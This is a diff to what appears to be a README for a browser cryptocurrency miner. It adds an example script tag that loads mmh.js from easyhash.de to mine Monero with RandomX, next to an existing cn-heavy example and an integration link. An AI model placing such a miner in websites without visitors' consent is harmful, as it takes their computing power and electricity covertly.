@@ -89,6 +89,10 @@ Information for all miners: Please use a own custom frontend solution for your 1
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn-heavy/tube?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
+#### Examples: RandomX as Test algo - proof of concept (Monero) need ?algo=rx/0<br> 
+```sh
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=rx/0?jason=Your_Favorite_Pool:PortNr" > </script>
+```
 <br><br> 
 Or use our integration for websites & blogs
 https://www.crypto-webminer.com/integrate.html
